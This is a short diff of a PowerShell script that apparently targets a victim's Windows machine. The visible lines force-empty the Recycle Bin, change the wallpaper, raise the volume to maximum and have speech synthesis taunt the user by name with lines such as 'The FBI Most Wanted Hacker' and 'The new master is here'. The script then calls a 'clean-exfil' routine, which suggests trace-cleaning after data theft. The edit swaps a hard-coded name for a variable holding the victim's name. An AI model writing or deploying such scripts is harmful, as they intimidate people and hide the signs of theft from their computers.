@@ -386,7 +386,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
  
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
-Start-Sleep -s 5
+Start-Sleep -s 3
 
 # Sets Volume to max level
 
@@ -396,7 +396,7 @@ $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -
 
 $s=New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
-$s.Speak("We found you CRAZY PANDA")
+$s.Speak("We found you $FN")
 $s.Speak("The FBI Most Wanted Hacker")
 $s.Speak("Your title has been revoked.")
 $s.Speak("The new master is here")
@@ -405,6 +405,7 @@ $s.Speak("Good luck next time")
 clean-exfil
 
 #------------------------------------------------------------------------------------------------------
+
 
 
 
